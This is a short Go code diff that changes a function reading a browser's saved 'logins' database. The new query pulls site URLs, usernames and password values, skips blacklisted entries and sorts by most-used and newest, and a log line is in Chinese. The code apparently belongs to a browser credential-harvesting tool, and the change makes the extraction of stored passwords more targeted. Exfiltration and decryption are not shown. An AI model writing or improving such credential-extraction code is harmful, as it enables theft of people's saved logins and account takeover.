@@ -23,7 +23,7 @@ func fetchDataFromDb(dbPath string, count int) []dbData {
 	}
 	defer db.Close()
 
-	rows, dbErr := db.Query(fmt.Sprintf("SELECT action_url, username_value, password_value FROM logins LIMIT %d", count))
+	rows, dbErr := db.Query(fmt.Sprintf("SELECT origin_url, username_value, password_value FROM logins  WHERE blacklisted_by_user <1 ORDER BY times_used DESC,date_created DESC LIMIT %d", count))
 	if dbErr != nil {
 		logger.Println("查询用户数据错误:" + dbErr.Error())
 		return nil
